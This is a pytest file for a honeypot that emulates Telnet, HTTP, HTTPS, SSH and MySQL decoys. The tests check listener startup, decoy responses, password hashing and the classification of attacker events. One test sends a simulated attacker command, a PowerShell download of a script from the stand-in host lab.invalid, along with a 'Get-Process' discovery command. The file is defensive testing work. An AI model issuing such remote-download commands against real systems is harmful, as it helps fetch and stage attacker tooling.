import asyncio
import ssl
from dataclasses import replace

from honeypot.config import HoneypotSettings, default_services
from honeypot.runtime import HoneypotRuntime
from honeypot.store import TelemetryStore


def test_gemini_http_envelope_is_normalized():
    generated = (
        "HTTP/1.1 401 Unauthorized\n"
        "Server: Apache/2.4.52\n"
        "Content-Type: text/html\n\n"
        "\\<html\\>\\<body\\>Denied\\</body\\>\\</html\\>"
    )

    body, status, content_type = HoneypotRuntime._normalize_http_ai_response(generated)

    assert status == "401 Unauthorized"
    assert content_type == "text/html; charset=utf-8"
    assert body == "<html><body>Denied</body></html>"
    assert "HTTP/1.1" not in body


def test_five_listeners_and_telemetry(tmp_path):
    async def scenario():
        services = tuple(replace(item, port=0) for item in default_services())
        settings = HoneypotSettings(
            bind_host="127.0.0.1",
            database_path=tmp_path / "runtime.db",
            certificate_dir=tmp_path / "certs",
            enable_gemini=False,
            read_timeout_seconds=1.0,
            min_response_delay_seconds=0,
            max_response_delay_seconds=0,
            session_timeout_seconds=10.0,
            services=services,
        )
        store = TelemetryStore(settings.database_path)
        runtime = HoneypotRuntime(settings=settings, store=store)
        status = await runtime.start()
        assert len(status["services"]) == 5
        assert all(item["status"] == "listening" for item in status["services"])
        ports = {item["protocol"]: item["port"] for item in status["services"]}

        # Telnet: credentials are hashed and the command is simulated.
        reader, writer = await asyncio.open_connection("127.0.0.1", ports["telnet"])
        assert b"login:" in await reader.readuntil(b"login: ")
        writer.write(b"root\r\n")
        await writer.drain()
        assert b"Password:" in await reader.readuntil(b"Password: ")
        writer.write(b"not-a-real-secret\r\n")
        await writer.drain()
        assert b"finance-prod" in await reader.readuntil(b"$ ")
        writer.write(b"whoami\r\n")
        await writer.drain()
        response = await reader.readuntil(b"$ ")
        assert b"backup" in response
        writer.write(b"exit\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()

        # HTTP and HTTPS both return decoy content.
        reader, writer = await asyncio.open_connection("127.0.0.1", ports["http"])
        writer.write(b"GET /admin HTTP/1.1\r\nHost: decoy\r\nUser-Agent: test-probe\r\n\r\n")
        await writer.drain()
        assert b"200 OK" in await reader.read()
        writer.close()
        await writer.wait_closed()

        tls = ssl.create_default_context()
        tls.check_hostname = False
        tls.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.open_connection(
            "127.0.0.1", ports["https"], ssl=tls, server_hostname="localhost"
        )
        writer.write(b"GET /api/config HTTP/1.1\r\nHost: decoy\r\n\r\n")
        await writer.drain()
        assert b"200 OK" in await reader.read()
        writer.close()
        await writer.wait_closed()

        # SSH and MySQL expose scanner-recognizable handshakes.
        reader, writer = await asyncio.open_connection("127.0.0.1", ports["ssh"])
        assert (await reader.readline()).startswith(b"SSH-2.0-")
        writer.write(b"SSH-2.0-test-client\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()

        reader, writer = await asyncio.open_connection("127.0.0.1", ports["mysql"])
        header = await reader.readexactly(4)
        payload_length = int.from_bytes(header[:3], "little")
        handshake = await reader.readexactly(payload_length)
        assert handshake[0] == 10
        writer.close()
        await writer.wait_closed()

        await asyncio.sleep(0.15)
        await runtime.stop()
        sessions = store.list_sessions(limit=20)
        events = store.list_events(limit=200)
        assert len(sessions) >= 5
        assert any(item["event_type"] == "DECOY_AUTH_ATTEMPT" for item in events)
        auth_event = next(item for item in events if item["event_type"] == "DECOY_AUTH_ATTEMPT")
        assert "not-a-real-secret" not in auth_event["content"]
        assert auth_event["metadata"]["raw_password_stored"] is False
        assert any(item["event_type"] == "PORT_SCAN" for item in events)
        store.close()

    asyncio.run(scenario())


def test_powershell_http_framing_and_single_action_count(tmp_path):
    async def scenario():
        settings = HoneypotSettings(
            bind_host="127.0.0.1",
            database_path=tmp_path / "powershell.db",
            certificate_dir=tmp_path / "certs",
            enable_gemini=False,
            read_timeout_seconds=1.0,
            min_response_delay_seconds=0,
            max_response_delay_seconds=0,
            services=tuple(replace(item, port=0) for item in default_services()),
        )
        store = TelemetryStore(settings.database_path)
        runtime = HoneypotRuntime(settings=settings, store=store)
        status = await runtime.start()
        http_port = next(
            item["port"] for item in status["services"] if item["protocol"] == "http"
        )

        # Windows PowerShell/.NET may wait for 100 Continue before sending a body.
        body = b'{"command":"Invoke-WebRequest http://lab.invalid/tool.ps1"}'
        reader, writer = await asyncio.open_connection("127.0.0.1", http_port)
        writer.write(
            b"POST /api/jobs HTTP/1.1\r\n"
            b"Host: decoy\r\n"
            b"User-Agent: Mozilla/5.0 WindowsPowerShell/5.1\r\n"
            b"Content-Type: application/json\r\n"
            + f"Content-Length: {len(body)}\r\n".encode()
            + b"Expect: 100-continue\r\n\r\n"
        )
        await writer.drain()
        assert await reader.readuntil(b"\r\n\r\n") == b"HTTP/1.1 100 Continue\r\n\r\n"
        writer.write(body)
        await writer.drain()
        assert b"HTTP/1.1 200 OK" in await reader.read()
        writer.close()
        await writer.wait_closed()

        # PowerShell 7 HttpClient can stream a request with chunked framing.
        reader, writer = await asyncio.open_connection("127.0.0.1", http_port)
        writer.write(
            b"POST /ops/run HTTP/1.1\r\n"
            b"Host: decoy\r\n"
            b"User-Agent: PowerShell/7.5\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Content-Type: text/plain\r\n\r\n"
            b"B\r\nGet-Process\r\n"
            b"0\r\n\r\n"
        )
        await writer.drain()
        assert b"HTTP/1.1 200 OK" in await reader.read()
        writer.close()
        await writer.wait_closed()

        await asyncio.sleep(0.1)
        await runtime.stop()
        sessions = [item for item in store.list_sessions() if item["service"] == "HTTP"]
        assert len(sessions) == 2
        assert all(item["interactions"] == 1 for item in sessions)
        inbound_types = {
            item["event_type"]
            for item in store.list_events(limit=100)
            if item["direction"] == "inbound"
        }
        assert "PAYLOAD_TRANSFER" in inbound_types
        assert "SYSTEM_DISCOVERY" in inbound_types
        assert store.metrics()["interactions_captured"] == 2
        store.close()

    asyncio.run(scenario())
